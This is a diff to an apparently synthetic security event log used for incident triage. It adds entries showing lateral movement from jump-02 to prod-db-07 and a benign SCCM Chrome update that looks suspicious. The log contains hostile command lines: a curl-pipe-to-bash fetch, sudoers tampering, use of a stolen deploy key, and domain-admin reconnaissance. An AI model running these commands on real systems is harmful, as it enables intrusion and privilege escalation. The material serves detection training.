@@ -8,7 +8,9 @@
 {"time": "2026-09-27T22:40:51Z", "type": "ssh", "user": "svc_deploy", "src_ip": "10.20.4.15", "host": "prod-db-07", "result": "success"}
 {"time": "2026-09-27T22:41:03Z", "type": "file_write", "user": "svc_deploy", "src_ip": "10.20.4.15", "host": "prod-db-07", "path": "/etc/sudoers.d/99-temp"}
 {"time": "2026-09-27T22:43:30Z", "type": "process", "user": "svc_deploy", "src_ip": "10.20.4.15", "host": "prod-db-07", "detail": "sudo -i; curl http://10.20.4.15:8000/x.sh | bash"}
-{"time": "2026-09-27T22:39:12Z", "type": "auth", "user": "rpatel", "src_ip": "10.20.4.15", "host": "jump-02", "result": "success"}
+{"time": "2026-09-27T22:39:12Z", "type": "auth", "user": "rpatel", "src_ip": "10.30.2.91", "host": "jump-02", "result": "success"}
+{"time": "2026-09-27T22:39:40Z", "type": "process", "user": "rpatel", "src_ip": "10.30.2.91", "host": "jump-02", "detail": "cd /tmp/.r && nohup python3 -m http.server 8000 &"}
+{"time": "2026-09-27T22:40:48Z", "type": "process", "user": "rpatel", "src_ip": "10.30.2.91", "host": "jump-02", "detail": "ssh -i /opt/deploy/keys/svc_deploy_ed25519 svc_deploy@prod-db-07"}
 {"time": "2026-09-27T09:10:02Z", "type": "process", "user": "mlee", "src_ip": "10.30.8.112", "host": "wks-mlee-01", "detail": "Invoice_Sept.pdf.exe spawned rundll32.exe"}
 {"time": "2026-09-27T09:12:45Z", "type": "network", "user": "mlee", "src_ip": "10.30.8.112", "host": "wks-mlee-01", "dest": "45.137.21.9:443", "bytes_out": 512}
 {"time": "2026-09-27T09:13:45Z", "type": "network", "user": "mlee", "src_ip": "10.30.8.112", "host": "wks-mlee-01", "dest": "45.137.21.9:443", "bytes_out": 498}
@@ -50,3 +52,6 @@
 {"time": "2026-09-28T23:19:05Z", "type": "account_change", "user": "hd_tmorgan", "src_ip": "10.30.9.77", "host": "dc-01", "target_user": "jlopez", "detail": "Password reset for jlopez; account re-enabled"}
 {"time": "2026-09-28T23:23:51Z", "type": "auth", "user": "jlopez", "src_ip": "10.30.9.77", "host": "dc-01", "result": "success"}
 {"time": "2026-09-28T23:25:16Z", "type": "process", "user": "jlopez", "src_ip": "10.30.9.77", "host": "dc-01", "detail": "net group \"Domain Admins\" /domain; nltest /domain_trusts"}
+{"time": "2026-10-02T16:00:05Z", "type": "process", "user": "svc_sccm", "src_ip": "10.40.3.58", "host": "fin-wks-14", "detail": "CcmExec.exe spawned powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand JABhAHAAcABzACAAPQAgAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFUAbgBpAG4AcwB0AGEAbABsAFwAKgAnACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAARABpAHMAcABsAGEAeQBOAGEAbQBlACAALQBsAGkAawBlACAAJwBHAG8AbwBnAGwAZQAgAEMAaAByAG8AbQBlACoAJwA7ACAAaQBmACAAKAAkAGEAcABwAHMALgBEAGkAcwBwAGwAYQB5AFYAZQByAHMAaQBvAG4AIAAtAGwAdAAgACcAMQAzADAALgAwACcAKQAgAHsAIABlAHgAaQB0ACAAMQAgAH0AIABlAGwAcwBlACAAewAgAGUAeABpAHQAIAAwACAAfQA=", "decoded_command": "$apps = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Where-Object DisplayName -like 'Google Chrome*'; if ($apps.DisplayVersion -lt '130.0') { exit 1 } else { exit 0 }"}
+{"time": "2026-10-02T16:00:41Z", "type": "network", "user": "svc_sccm", "src_ip": "10.40.3.58", "host": "fin-wks-14", "dest": "10.10.2.20:443", "bytes_in": 112640331}
+{"time": "2026-10-02T16:03:12Z", "type": "process", "user": "svc_sccm", "src_ip": "10.40.3.58", "host": "fin-wks-14", "detail": "CcmExec.exe spawned msiexec.exe /i GoogleChromeStandaloneEnterprise64.msi /qn"}
